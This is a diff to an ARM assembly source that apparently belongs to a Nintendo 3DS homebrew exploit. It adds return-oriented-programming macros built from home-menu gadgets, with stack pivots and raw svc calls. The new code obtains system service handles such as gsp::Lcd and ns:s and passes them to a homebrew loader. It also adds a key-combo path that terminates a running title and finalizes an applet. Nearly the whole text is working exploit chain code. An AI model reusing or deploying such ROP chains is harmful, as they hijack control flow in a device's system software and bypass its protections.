@@ -57,9 +57,9 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 .endmacro
 
 ; this memcpy's the size bytes that immediately preceed its call
-.macro memcpy_r0_lr_prev,size,skip
+.macro memcpy_r0_lr_prev,size,skip,offset
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
-		.word (MENU_OBJECT_LOC + (. - 4 - size) - object) ; r1 (src)
+		.word (MENU_OBJECT_LOC + offset + (. - 4 - size) - object) ; r1 (src)
 	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
 		.word size ; r2 (size)
 		.word 0xDEADBABE ; r3 (garbage)
@@ -538,6 +538,40 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
+.macro srv_subscribe_notification,id
+	set_lr MENU_NOP
+	.word ROP_MENU_POP_R0PC
+		.word id
+	.word ROP_MENU_SRV_SUBSCRIBE
+.endmacro
+
+.macro srv_get_handle,str_ptr,len,out_ptr
+	set_lr MENU_NOP
+	.word ROP_MENU_POP_R0PC
+		.word out_ptr
+	.word ROP_MENU_POP_R1PC
+		.word str_ptr
+	.word ROP_MENU_POP_R2R3R4R5R6PC
+		.word len
+		.word 0x00000000
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+	.word ROP_MENU_SRV_GETHANDLE
+.endmacro
+
+.macro srv_receive_notification
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R1PC
+		.word 0x000B0000 ; command header
+	.word ROP_MENU_STR_R1R0_POP_R4PC
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_SRV_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro invalidate_dcache,addr,size
 	get_cmdbuf 0
 	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
@@ -547,7 +581,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word size ; size
 		.word 0x00000000 ; size
 		.word 0xFFFF8001 ; process handle
-	memcpy_r0_lr_prev (4 * 5), 1
+	memcpy_r0_lr_prev (4 * 5), 1, 0
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
@@ -565,7 +599,28 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word tid_high ; tid high
 		.word timeout_low ; timeout low
 		.word 0x00000000 ; timeout high
-	memcpy_r0_lr_prev (4 * 5), 1
+	memcpy_r0_lr_prev (4 * 5), 1, 0
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
+.macro nss_terminate_tid_deref,tid_low_ptr,tid_high_ptr,timeout_low,offset
+	load_store tid_low_ptr, MENU_LOADEDROP_BUFADR + offset + @@tid_low
+	load_store tid_high_ptr, MENU_LOADEDROP_BUFADR + offset + @@tid_high
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
+		.word 0x00110100 ; command header
+		@@tid_low:
+		.word 0xDEADBABE ; tid low
+		@@tid_high:
+		.word 0xDEADBABE ; tid high
+		.word timeout_low ; timeout low
+		.word 0x00000000 ; timeout high
+	memcpy_r0_lr_prev (4 * 5), 1, offset
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
@@ -579,7 +634,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	.word ROP_MENU_POP_R4R5PC
 		.word 0x00230040 ; command header
 		.word 0x00000000
-	memcpy_r0_lr_prev (4 * 2), 1
+	memcpy_r0_lr_prev (4 * 2), 1, 0
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
@@ -596,7 +651,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0x00000000
 		.word 0x00000000
 		.word 0x00000002
-	memcpy_r0_lr_prev (4 * 5), 1
+	memcpy_r0_lr_prev (4 * 5), 1, 0
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
@@ -609,7 +664,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	get_cmdbuf 0
 	.word ROP_MENU_POP_R4PC
 		.word 0x004E0000 ; command header
-	memcpy_r0_lr_prev (4 * 1), 1
+	memcpy_r0_lr_prev (4 * 1), 1, 0
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
@@ -623,7 +678,21 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, r6, r7, r8, pc}
 		.word 0x00060040 ; command header
 		.word appid ; id
-	memcpy_r0_lr_prev (4 * 2), 1
+	memcpy_r0_lr_prev (4 * 2), 1, 0
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_APT_HANDLE ; r0 (apt handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
+.macro apt_finalize,appid
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, r6, r7, r8, pc}
+		.word 0x00040040 ; command header
+		.word appid ; id
+	memcpy_r0_lr_prev (4 * 2), 1, 0
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
@@ -912,6 +981,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 				mount_sdmc MENU_LOADEDROP_BUFADR + sdmc_str
 				control_memory MENU_SHAREDMEMBLOCK_PTR, HB_MEM0_ADDR, 0, HB_MEM0_SIZE, 0x3, 0x3
 				create_memory_block MENU_SHAREDMEMBLOCK_HANDLE, HB_MEM0_ADDR, HB_MEM0_SIZE, 0x3, 0x3
+				srv_get_handle MENU_LOADEDROP_BUFADR + gsplcdString, 8, MENU_GSPLCD_HANDLE
 
 			; overwrite jump_sp APT_TitleLaunch's destination
 				store MENU_LOADEDROP_BUFADR + APT_TitleLaunch_end, MENU_LOADEDROP_BKP_BUFADR + APT_TitleLaunch - 0x8 ; a = skip APT_TitleLaunch, dst = sp location
@@ -945,15 +1015,17 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		; release gsp rights
 			gsp_release_right
 
+		; memcpy wait loop to destination
+		; do it before sending handles because bootloader overwrites the ropbin, so let's avoid a race condition !
+			memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_end-waitLoop_start), 0, 0
+
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + fsUserString, MENU_FS_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + nssString, MENU_NSS_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + irrstString, MENU_IRRST_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + amsysString, MENU_AMSYS_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + ptmsysmString, MENU_PTMSYSM_HANDLE
+			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + gsplcdString, MENU_GSPLCD_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + hbMem0String, MENU_SHAREDMEMBLOCK_HANDLE
-
-		; memcpy wait loop to destination
-			memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_end-waitLoop_start), 0, 0
 
 		; jump to wait loop
 			jump_sp WAITLOOP_DST
@@ -1015,6 +1087,10 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.byte 0x00
 	ptmsysmString:
 		.ascii "ptm:sysm"
+		.byte 0x00
+	gsplcdString:
+		.ascii "gsp::Lcd"
+		.byte 0x00
 	hbMem0String:
 		.ascii "hb:mem0"
 		.byte 0x00
@@ -1089,6 +1165,21 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			.word MENU_NOP ; pc
 		waitLoop:
 			sleep 500*1000*1000, 0x00000000
+
+			; check keycombo
+			cond_jump_sp MENU_LOADEDROP_BUFADR + waitLoop_keycomboend + WAITLOOP_OFFSET, 0x1000001C, 0x300 ; L+R (TEMP)
+
+				nss_terminate_tid_deref MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_tidlow, MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_tidhigh, 1000*1000*1000, WAITLOOP_OFFSET
+
+				sleep 1000*1000*1000, 0x00000000
+
+				apt_open_session 0, WAITLOOP_OFFSET
+				apt_finalize 0x300
+				apt_close_session 0, WAITLOOP_OFFSET
+
+				load_store MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_marker + 4, MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_marker - 4
+
+			waitLoop_keycomboend:
 
 			apt_open_session 1, WAITLOOP_OFFSET
 			apt_inquire_notification 0x101, MENU_LOADEDROP_BUFADR + notificationType, 1, WAITLOOP_OFFSET
@@ -1261,8 +1352,14 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 				.word WAITLOOP_DST + waitLoop_pivot_data - waitLoop_start + 4 ; r4
 			.word ROP_MENU_STACK_PIVOT
+				waitLoop_marker:
 				.word 0xBABEBAD0 ; marker
-				.word ROP_MENU_POP_R4R5PC ; rop gadget to replace pivot with
+				.word ROP_MENU_POP_R4R5R6R7R8PC ; rop gadget to replace pivot with
+				waitLoop_tidlow:
+				.word 0xBABE0004 ; tid_low
+				waitLoop_tidhigh:
+				.word 0xBABE0005 ; tid_high
+				.word 0xDEADBABE
 			gsp_acquire_right
 			writehwreg 0x202A04, 0x01FF00FF
 			; todo : add cache invalidation for ropbin
